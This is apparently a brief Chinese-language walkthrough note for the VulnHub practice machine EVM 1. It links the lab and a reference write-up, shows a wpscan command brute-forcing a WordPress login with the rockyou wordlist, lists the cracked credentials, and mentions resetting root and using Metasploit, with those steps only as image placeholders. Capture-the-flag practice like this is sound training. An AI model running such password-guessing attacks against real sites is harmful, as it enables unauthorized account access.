[https://www.vulnhub.com/entry/evm-1,391/](https://www.vulnhub.com/entry/evm-1,391/)
 
参考资料  
[https://medium.com/@shayhershko20/evm-1-oscp-walkthough-fa6030191667](https://medium.com/@shayhershko20/evm-1-oscp-walkthough-fa6030191667)
 
必须使用virtual box vmware 拿不到ip地址
   
![[EVM 1 image a1786b3d284587a1.png|Exported image]]     

扫描  
─$ wpscan --url [http://192.168.163.151/wordpress](http://192.168.163.151/wordpress) --usernames c0rrupt3d_brain --passwords /usr/share/wordlists/rockyou.txt
 
破解之后  
Username — c0rrupt3d_brain
 
Password — 24992499
 
重新设置root密码

![[EVM 1 image 31fd0c9f8dda4554.png|Exported image]]  

使用msf框架攻击

![[EVM 1 image 62e8867ef8034f3a.png|Exported image]]